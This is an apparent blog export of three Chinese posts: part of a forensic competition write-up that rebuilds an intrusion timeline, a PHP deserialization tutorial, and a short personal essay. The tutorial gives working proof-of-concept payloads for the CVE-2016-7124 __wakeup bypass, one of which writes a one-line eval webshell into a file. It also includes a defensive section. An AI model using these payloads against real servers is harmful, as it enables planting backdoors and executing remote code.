<h4 id="1-github访问"><a href="#1-github访问" class="headerlink" title="1.github访问"></a>1.github访问</h4><p>使用火眼介质分析分析上网记录发现目标服务器（192.168.184.128）的访问记录：<br>16:17分找到权限并尝试登陆页面<br><img src="/2021/03/24/changAnCup/45.png"><br>结合前面服务器的登陆日志、网站访问日志、抓包文件等分析结果确认最早入侵时间为北京时间2019-07-13 16：17：35（注意！目标服务器的时区为0时区，与北京时间相差8小时）<br><img src="/2021/03/24/changAnCup/46.png"><br><img src="/2021/03/24/changAnCup/47.png"></p>
<p>在入侵开始时，嫌疑人除访问目标服务器外，还访问了github，根据上网记录登陆github网址查看，搜索用户PackerLin，查看该用户页面，发现其上传过test2的文件，下载后发现为密钥文件，使用该文件尝试连接目标服务器，可以成功登陆，结合检材1默认设置为密钥登陆（禁用密码登陆），可以确认嫌疑人是从git上发现了服务器的连接密钥，从而对服务器实施的入侵。<br><img src="/2021/03/24/changAnCup/48.png"></p>
<h4 id="2-手机备份分析"><a href="#2-手机备份分析" class="headerlink" title="2.手机备份分析"></a>2.手机备份分析</h4><p>使用火眼介质分析发现内容如下:<br>IOS备份，虚拟机记录Ubuntu，Xshell连接密钥<br> <img src="/2021/03/24/changAnCup/49.png"><br>通过仿真启动检材4镜像，在桌面看到如下内容：<br>Xshell直接运行起来发现其中有两个连接记录，通过密钥的方式进行的连接，密钥文件为packerlin’s test（Xshell的缓存）<br><img src="/2021/03/24/changAnCup/50.png"><br>同时桌面还有一个便签内容为‘niuroumian6’，一个新建文本文档，打开之后看起来像一个密码字典，<br><img src="/2021/03/24/changAnCup/51.png"><br>使用火眼添加手机备份文件为证据直接进行分析，发现该手机备份为加密备份，尝试发现的各种密码，‘niuroumian6’成功解开备份，可以直接对手机备份进行分析，手机内的短信、微信、qq中均发现案件相关聊天记录，通过聊天记录基本可以梳理出来整个案发的流程，同时通过短信了解到该嫌疑人还使用钓鱼网站对一名受害者进行诈骗：<br><img src="/2021/03/24/changAnCup/52.png"><br>通过对检材4分析，发现前面的虚拟机有嫌疑，因此导出虚拟机查看<br> <img src="/2021/03/24/changAnCup/53.png"></p>
<h4 id="3-网站重构"><a href="#3-网站重构" class="headerlink" title="3.网站重构"></a>3.网站重构</h4><p>在前面检材分析过程中，发现mongo服务器的数据库被drop掉，数据库中无内容，结合后面聊天记录了解到，在检材2的root目录下存在一个被加密的db，应该是嫌疑人要对目标进行勒索，因此下载了加密软件进行了加密<br><img src="/2021/03/24/changAnCup/60.png"><br>方法1：可以尝试使用逆向工程的方法对encrypt（5）文件进行分析，查看大致的加密方式，从而尝试破解或者解密。使用IDA对ELF文件进行逆向分析，可以通过代码或者流图大致看出该加密方式为逐字节+66（10进制），然后和AA进行异或，由于加密方式很简单可以通过WINHEX或者编写简单脚本即可实现解密。<br><img src="/2021/03/24/changAnCup/61.png"><br><img src="/2021/03/24/changAnCup/62.png"><br>方法2：<br>在windows检材中，C盘根目录发现了一个VHD的文件，<br><img src="/2021/03/24/changAnCup/63.png"><br> 双击直接运行，win10系统会自动挂载，发现该分区为bitloker加密分区，通过时间线分析（详见下文），发现该检材又发出过邮件，但是本机未分析出来，通过前面的流量包考虑到，该设备的流程应该都被检材3监听下来，因此尝试对数据包进行分析，发现了一份邮件发出的数据包，追踪TCP流将邮件提取出，发现了备份的bitlocker密钥，但是压缩包加过密码，因此需要尝试破解，联想到之前发现的密码线索桌面字典和便签，尝试对该压缩包进行字典破解，成功破解出密码  !VCHWEDfdfd2IOA564356:”:”  ，<br><img src="/2021/03/24/changAnCup/64.png"><br><img src="/2021/03/24/changAnCup/65.png"><br><img src="/2021/03/24/changAnCup/66.png"><br>成功解压后，可以对加密分区进行解密，该分区内发现了3个与案件相关的重要文件，结合时间线，db文件为嫌疑人拖库的mongo数据，decrypt为解密程序，we.tar.gz为嫌疑人下载的网站代码，因此直接使用db，或者上传decrypt（解压密码为便签内容）到检材1、2，对其中加密的文件进行解密<br> <img src="/2021/03/24/changAnCup/67.png"></p>
<p>通过上述两种方法，我们可以找到正常的数据库备份文件db，因此导回检材2的mongo数据库中，可以尝试重启网站：<br><img src="/2021/03/24/changAnCup/68.png"><br>由于检材在本地仿真的时候IP发生了变化，因此要调整配置文件的内容，对检材1中的nginx配置文件和数据库配置文件进行修改，此处修改要根据自己虚拟机网络配置的情况进行修改，修改好配置之后，将docker中的run.sh脚本复制到网站目录执行后可以启动网站。<br><img src="/2021/03/24/changAnCup/69.png"><br><img src="/2021/03/24/changAnCup/70.png"><br><img src="/2021/03/24/changAnCup/71.png"><br>查看检材1中网站配置文件/server/index.js，发现该文件引用了api.js，查看该文件发现其中关键的验证登录的字段，直接使用数据库种明文密码登陆，因此登陆数据库查看user表，使用表中用户登陆网站，成功登陆进去<br><img src="/2021/03/24/changAnCup/72.png"><br><img src="/2021/03/24/changAnCup/73.png"><br><img src="/2021/03/24/changAnCup/74.png"></p>
<h3 id="案情时间线梳理"><a href="#案情时间线梳理" class="headerlink" title="案情时间线梳理"></a>案情时间线梳理</h3><p>16:17分找到权限并尝试登陆页面<br><img src="/2021/03/24/changAnCup/80.png"><br>16:19:54下载密钥文件<br><img src="/2021/03/24/changAnCup/81.png"><br>16:20:42 运行xshell<br><img src="/2021/03/24/changAnCup/82.png"><br>16:21:18 设置用户密钥<br><img src="/2021/03/24/changAnCup/83.png"><br>16:21:28 成功连接128服务器<br><img src="/2021/03/24/changAnCup/84.png"><br>16:31:06 初次启动xftp，创建文件夹及文件<br><img src="/2021/03/24/changAnCup/85.png"><br>16;33:00传输web文件，16:33:15传输完成<br><img src="/2021/03/24/changAnCup/86.png"><br><img src="/2021/03/24/changAnCup/87.png"></p>
<p>16:34:55 登陆网页微信<br><img src="/2021/03/24/changAnCup/88.png"><br>16:40:13 打开rar，解压web文件<br><img src="/2021/03/24/changAnCup/89.png"><br>16:44:03查看关键数据库链接文件<br><img src="/2021/03/24/changAnCup/90.png"><br>16:45:45——数据库连接<br><img src="/2021/03/24/changAnCup/91.png"><br>16:53:45——17:12:30 手机QQ/微信购买ddos<br><img src="/2021/03/24/changAnCup/92.png"><br>17:15:33 下载runit（DDOS）<br><img src="/2021/03/24/changAnCup/93.png"><br>17:18:20新建xshell连接，17:18:55连接成功<br><img src="/2021/03/24/changAnCup/94.png"><br>17:22:23 下载db<br><img src="/2021/03/24/changAnCup/95.png"><br><img src="/2021/03/24/changAnCup/96.png"><br>17:27:53——17:37:56 手机QQ/微信购买加密解密<br><img src="/2021/03/24/changAnCup/97.png"><br>17:39:32 下载解密程序<br><img src="/2021/03/24/changAnCup/98.png"><br>17:42:20 再次访问129服务器<br><img src="/2021/03/24/changAnCup/99.png"><br>17:44:35 再次连接128服务器<br><img src="/2021/03/24/changAnCup/100.png"><br>17:45:16 XFTP连接128服务器<br><img src="/2021/03/24/changAnCup/101.png"><br><img src="/2021/03/24/changAnCup/102.png"><br>17:49:01 bitlocker加密<br><img src="/2021/03/24/changAnCup/103.png"><br>17:49:45 密钥生成于C:\users<br><img src="/2021/03/24/changAnCup/104.png"><br>17:51:47 桌面出现txt<br><img src="/2021/03/24/changAnCup/105.png"><br>17:52:19 目录下出现BitLocker.rar<br><img src="/2021/03/24/changAnCup/106.png"><br>17:53:24 运行foxmail<br><img src="/2021/03/24/changAnCup/107.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考:"></a>参考:</h2><p>1.<a href="https://xdforensics-wiki.github.io/XDforensics-wiki/linux2/#docker">https://xdforensics-wiki.github.io/XDforensics-wiki/linux2/#docker</a><br>1、<a href="https://www.jianshu.com/p/806485990aea">https://www.jianshu.com/p/806485990aea</a> Docker文件目录 - 简书<br>2、<a href="https://hub.docker.com/_/mysql">https://hub.docker.com/_/mysql</a> mysql - Docker Hub<br>3、李鹏超, 周凯. 基于Docker容器的电子数据取证方法[J]. 吉林大学学报(理学版), 2019, 57(06): 1485-1490.</p>
]]></content>
      <categories>
        <category>电子数据取证</category>
        <category>计算机取证</category>
      </categories>
      <tags>
        <tag>电子取证</tag>
        <tag>时间线重构</tag>
      </tags>
  </entry>
  <entry>
    <title>理解PHP反序列化原理及利用</title>
    <url>/2021/03/24/php-unserialize/</url>
    <content><![CDATA[<h2 id="0x01-原理解释"><a href="#0x01-原理解释" class="headerlink" title="0x01 原理解释"></a>0x01 原理解释</h2><blockquote>
<p><strong>PHP的反序列化漏洞</strong>其实是PHP对象的属性篡改漏洞。漏洞的成因在于代码中unserialize的参数不可控。导致服务器能够接收我们反序列化过的字符串、并且未经过滤的把其中的变量直接放进魔术方法里面执行以实现攻击. </p>
</blockquote>
<blockquote>
<p>PHP unserialization vulnerability is actually a PHP object property tamper vulnerability.The cause of the vulnerability is that the parameters of unserialize in the code are not controllable.The server was able to receive the deserialized string and unfiltered its variables directly into the magic method to execute the attack.**PHP deserialization vulnerability ** is actually a PHP object property tamper vulnerability.The cause of the vulnerability is that the parameters of unserialize in the code are not controllable.The server was able to receive the deserialized string and unfiltered its variables directly into the magic method to execute the attack.</p>
</blockquote>
<h3 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1. 基础知识"></a>1. 基础知识</h3><ol>
<li>php源码同python一样是由c所写</li>
<li>可以序列化的对象都可以反序列化</li>
<li>序列化只序列化对象的属性，不序列化方法</li>
<li>如果希望PHP调用魔术方法，必须首先在类中定义，否则PHP不会执行未创建的魔术方法。</li>
<li>序列化后包括，类为object,类长度为4，名为test,包含3个属性：<br> 第一个属性为string,长度为10，名为testflag;值长度为6，名为active；因为<strong>prvate</strong>,故而序列化后，原名test被更改<br> 第二个同上; 因为<strong>protected</strong>，故而序列化后,原名前加*<br> 第三个同上; 因为<strong>public</strong>，故而序列化后,原名不变<br> <img src="/2021/03/24/php-unserialize/1.jpg"><br> private序列化后格式：\x00+类名+\x00+属性名<br> <img src="/2021/03/24/php-unserialize/2.png"><br> protected序列化后格式：\x00+*+\x00+属性名<br> <img src="/2021/03/24/php-unserialize/3.png"></li>
<li>可能有人会问为什么要序列化，因为要使复杂数据写入进程间内存、文件或数据库更容易。所以采取序列化，将复杂的数据结构(对象及其属性)转换成“更扁平”的格式，作为字节顺序流传输。而反序列化将字节流还原为原始对象，方便与网站逻辑交互。</li>
</ol>
<h3 id="2-魔术方法"><a href="#2-魔术方法" class="headerlink" title="2. 魔术方法"></a>2. 魔术方法</h3><p>魔术方法(按照常见度排序)：以两个下划线__开头，包括：<br>(1)__construct()，类的构造函数，当对象创建时会自动调用(但在unserialize()时是不会自动调用的)<br>(2)__sleep()，执行serialize()时，先会调用这个函数<br>(3)__wakeup()，unserialize()时，先会调用这个函数<br>(4)__destruct()，类的析构函数，当对象被销毁时会自动调用<br>(5)__toString()，类被当成字符串时的回应方法。当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用<br>(6)__get()，获得一个类的成员变量时调用。当从不可访问的属性读取数据<br>(7)__call()，在对象中调用一个不可访问方法时调用<br>(8)__callStatic()，用静态方式中调用一个不可访问方法时调用<br>(9)__set()，设置一个类的成员变量时调用</p>
<hr>
<p>其中，__toString()触发条件较多，包括以下：</p>
<p>(1)echo ($obj) / print($obj) 打印时会触发</p>
<p>(2)反序列化对象与字符串连接时</p>
<p>(3)反序列化对象参与格式化字符串时</p>
<p>(4)反序列化对象与字符串进行==比较时（PHP进行==比较的时候会转换参数类型）</p>
<p>(5)反序列化对象参与格式化SQL语句，绑定参数时</p>
<p>(6)反序列化对象在经过php字符串函数，如 strlen()、addslashes()时</p>
<p>(7)在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有toString返回的字符串的时候toString会被调用</p>
<p>(8)反序列化的对象作为 class_exists() 的参数的时候</p>
<h3 id="3-序列化与反序列化"><a href="#3-序列化与反序列化" class="headerlink" title="3. 序列化与反序列化"></a>3. 序列化与反序列化</h3><p>序列化$data并输出到serialize.txt文件中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test &#123;</span><br><span class="line">    private $flag &#x3D; &#39;Inactive&#39;;</span><br><span class="line">    protected $test &#x3D; &#39;test&#39;;</span><br><span class="line">    public $test1 &#x3D; &#39;test1&#39;;</span><br><span class="line"></span><br><span class="line">    public function set_flag($flag)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;flag &#x3D; $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    public function get_flag($flag)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$object &#x3D; new test();</span><br><span class="line">$object-&gt;set_flag(&#39;active&#39;);</span><br><span class="line">$data &#x3D; serialize($object);</span><br><span class="line">file_put_contents(&quot;serialize.txt&quot;,$data);</span><br><span class="line">echo $data;</span><br></pre></td></tr></table></figure>
<p>反序列化serialize.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test</span><br><span class="line">&#123;</span><br><span class="line">    private $flag &#x3D; &#39;Inactive&#39;;</span><br><span class="line">    protected $test &#x3D; &quot;test&quot;;</span><br><span class="line">    public $test1 &#x3D; &quot;test1&quot;;</span><br><span class="line">    public function set_flag($flag)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;flag &#x3D; $flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function get_flag()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$data &#x3D; file_get_contents(&quot;serialize.txt&quot;);</span><br><span class="line">$data &#x3D; unserialize($data);</span><br><span class="line">echo $data-&gt;test1.&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo $data-&gt;get_flag(); &#x2F;&#x2F; correspond to serialize.php</span><br></pre></td></tr></table></figure>
<p>魔术方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class swanQ</span><br><span class="line">&#123;</span><br><span class="line">    private $name &#x3D; &#39;swanQ&#39;;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;__construct&quot;;</span><br><span class="line">        echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __sleep()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;__sleep&quot;;</span><br><span class="line">        echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">        return array(&#39;name&#39;); &#x2F;&#x2F;**</span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;__wakeup&quot;;</span><br><span class="line">        echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;__destruct&quot;;</span><br><span class="line">        echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    function __toString()&#123;</span><br><span class="line">        return &quot;__toString&quot;.&quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$object &#x3D; new swanQ();</span><br><span class="line"></span><br><span class="line">$data &#x3D; serialize($object);</span><br><span class="line">$object1 &#x3D; unserialize($data);</span><br><span class="line">print $object1;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/03/24/php-unserialize/4.png"><br>新建一个对象时，会自动调用__construct()方法,<br>执行serialize前，会先调用共__sleep()方法<br>执行unserialize前，会先调用__wakeup()方法<br>__destruct()了两次说明，当前有两个对象，一个是将类实例化为对象的时候产生的，一个是反序列化后生成的对象。</p>
<h3 id="4-攻击示例"><a href="#4-攻击示例" class="headerlink" title="4.攻击示例"></a>4.攻击示例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;flag is in ctf.php</span><br><span class="line">class Shield&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    function __construct($filename &#x3D; &#39;&#39;)&#123;</span><br><span class="line">        $this-&gt;file &#x3D; $filename;</span><br><span class="line">    &#125;</span><br><span class="line">    function readfile()&#123;</span><br><span class="line">        if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;) &#x3D;&#x3D;&#x3D; FALSE</span><br><span class="line">        &amp;&amp; stripos($this-&gt;file,&#39;&#x2F;&#39;) &#x3D;&#x3D;&#x3D; FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\&#39;)&#x3D;&#x3D;&#x3D;FALSE)&#123;</span><br><span class="line">            return @file_get_contents($this-&gt;file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>shield.php,类中存在属性$file,且file会调用__construct方法。所以我们利用file即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once (&#39;shield.php&#39;);</span><br><span class="line">$x &#x3D; new Shield();</span><br><span class="line">isset($_GET[&#39;class&#39;]) &amp;&amp; $g &#x3D; $_GET[&#39;class&#39;];</span><br><span class="line">if (!empty($g))&#123;</span><br><span class="line">    $x &#x3D; unserialize($g);</span><br><span class="line">&#125;</span><br><span class="line">echo $x-&gt;readfile();</span><br></pre></td></tr></table></figure>
<p>包含shield.php,new实例时会调用__construct()方法，然后接收用户的反序列化并输出。<br>payload:直接构造序列化对象作为file的内容，O:6:”Shield”:1{s:4:”file”;s:8:”ctf.php”;}</p>
<h2 id="0x02-php绕过-wakeup：-CVE-2016-7124"><a href="#0x02-php绕过-wakeup：-CVE-2016-7124" class="headerlink" title="0x02 php绕过__wakeup： CVE-2016-7124"></a>0x02 php绕过__wakeup： CVE-2016-7124</h2><h3 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h3><p>执行unserialize恢复对象时，会先调用__wakeup()成员函数, 但是当序列化字符串中表示对象属性个数的值大于 真实的属性个数时会跳过__wakeup的执行。</p>
<p>漏洞概述: wakeup()魔法函数被绕过,导致执行了一些非预期效果的漏洞<br>漏洞原理: 当对象的属性(变量)数大于实际的个数时,__wakeup()魔法函数被绕过</p>
<h3 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h3><ul>
<li><p>漏洞影响版本：<br>PHP5 &lt; 5.6.25<br>PHP7 &lt; 7.0.10</p>
</li>
<li><p>复现环境</p>
<p>php5.4.5nts+apache+mysql（phpstudy）</p>
<p>phpinfo环境搭建成功，其中test.php,233.php均在www目录下。</p>
</li>
<li><p>编写测试脚本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class test&#123;</span><br><span class="line">    public $name &#x3D; &quot;fairy&quot;;</span><br><span class="line">    public function  __wakeup()&#123;</span><br><span class="line">        echo &quot;this is wakeup&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo &quot;this is destruct&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str &#x3D; $_GET[&quot;s&quot;];</span><br><span class="line">@$un_str &#x3D; unserialize($str);</span><br><span class="line"></span><br><span class="line">echo  $un_str-&gt;name.&quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>接收参数s，将其反序列化后输出属性name的值。</p>
</li>
</ul>
<p>编写POC访问该脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;test.php?s&#x3D;O:4:&quot;test&quot;:1:&#123;s:4:&quot;name&quot;;s:5:&quot;fairy&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/03/24/php-unserialize/5.png"></p>
<p>反序列化之前先调用了__wakeup方法，再调用__destruct方法。</p>
<p>构造payload将传入的序列化数据的对象变量个数由1加至2，绕过__wakeup方法执行。–反序列化数据失败无法创建对象的原因</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;test&quot;:1:&#123;s:4:&quot;name&quot;;s:5:&quot;fairy&quot;;</span><br><span class="line">O:4:&quot;test&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;fairy&quot;;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/03/24/php-unserialize/6.png"></p>
<p>页面只执行__destruct方法，没有输出name,是因为反序列化数据失败，导致无法创建对象。</p>
<p>修改测试脚本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test&#123;</span><br><span class="line">    public $name &#x3D; &quot;fairy&quot;;</span><br><span class="line"></span><br><span class="line">    public function  __wakeup()&#123;</span><br><span class="line">        echo &quot;this is wakeup&lt;br&gt;&quot;;</span><br><span class="line">        foreach(get_object_vars($this) as $k &#x3D;&gt; $v)&#123;</span><br><span class="line">            $this-&gt;$k &#x3D; null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo &quot;this is destruct&lt;br&gt;&quot;;</span><br><span class="line">        $fp &#x3D; fopen(&quot;D:\\phpstudy\\PHPTutorial\\WWW\\233.php&quot;,&quot;w&quot;);</span><br><span class="line">        fputs($fp,$this-&gt;name);</span><br><span class="line">        fclose($fp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str &#x3D; $_GET[&quot;s&quot;];</span><br><span class="line">@$un_str &#x3D; unserialize($str);</span><br><span class="line"></span><br><span class="line">echo  $un_str-&gt;name.&quot;&lt;br&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>构造POC写入一句话木马：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;test.php?s&#x3D;O:4:&quot;test&quot;:2:&#123;s:4:&quot;name&quot;;s:29:&quot;&lt;?php @eval($_POST[&#39;123&#39;]);?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/03/24/php-unserialize/8.png"></p>
<p>此时调用destruct方法会将name参数写入233.php文件，但windows弹窗自动禁止。</p>
<p>一句话木马被写入233.php。</p>
<h2 id="0x03-寻找php反序列化漏洞的流程"><a href="#0x03-寻找php反序列化漏洞的流程" class="headerlink" title="0x03 寻找php反序列化漏洞的流程"></a>0x03 寻找php反序列化漏洞的流程</h2><ul>
<li>寻找unserialize()函数的参数是否有可控点</li>
<li>寻找存在wakeup()或destruct()魔术方法的类</li>
<li>逐层研究该类在魔术方法种使用的属性及属性调用的方法，看是否有在当前调用种可以触发的可控属性</li>
<li>复制部分代码，构造序列化攻击</li>
</ul>
<h2 id="如何防止"><a href="#如何防止" class="headerlink" title="如何防止"></a>如何防止</h2><p>一般而言，除非绝对必要，否则应避免对用户输入进行反序列化。</p>
<p>在开始反序列化之前，必须进行检查。如果确实需要反序列化来自不受信任来源的数据，请采用措施以确保数据未被篡改。如可以使用数字签名来检查数据的完整性。</p>
<p>避免完全使用通用的反序列化功能。这些方法的序列化数据包含原始对象的所有属性，包括可能包含敏感信息的私有字段。可以创建自己的特定于类的序列化方法，以便至少可以控制公开哪些字段。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[1] 深入理解PHP反序列化漏洞:<a href="https://www.k0rz3n.com/2018/11/19/">https://www.k0rz3n.com/2018/11/19/</a><br>[2] CVE-2016-7124——php绕过__wakeup():<a href="http://www.cl4y.top/521/">http://www.cl4y.top/521/</a></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>网络安全</tag>
        <tag>渗透测试</tag>
        <tag>PHP</tag>
        <tag>CVE-2016-7124</tag>
        <tag>反序列化原理</tag>
      </tags>
  </entry>
  <entry>
    <title>夜思</title>
    <url>/2021/03/23/think/</url>
    <content><![CDATA[<p>初学网络安全是因为对于此专业的兴趣</p>
<p>抑或是对于白帽子的向往</p>
<p>但随着现在心态的成熟，看着周围越来越多同是网络空间安全专业的同学走上了开发的道路，真正搞安全的寥寥无几</p>
<p>内心五味杂陈</p>
<p>或许他们有了自己更加热爱的目标吧</p>
<p>但就现在的我而言，就我最近接触到的各位圈内的师傅们而言</p>
<p>尤其是在受了了八佰这部电影的启迪之后的我而言</p>
<p>我内心真实的想法是，我想要不断不断地提高自己的专业素养和专业技能，我想要为我们国家的网络安全事业奉献出属于自己的力量</p>
<p>每当挣扎在现实当中的时候，我相信前方一定有同伴在等着我，一起走在保家卫国的道路上</p>
]]></content>
      <categories>
        <category>思想生活</category>
      </categories>
      <tags>
        <tag>夜有所思</tag>
      </tags>
  </entry>
</search>
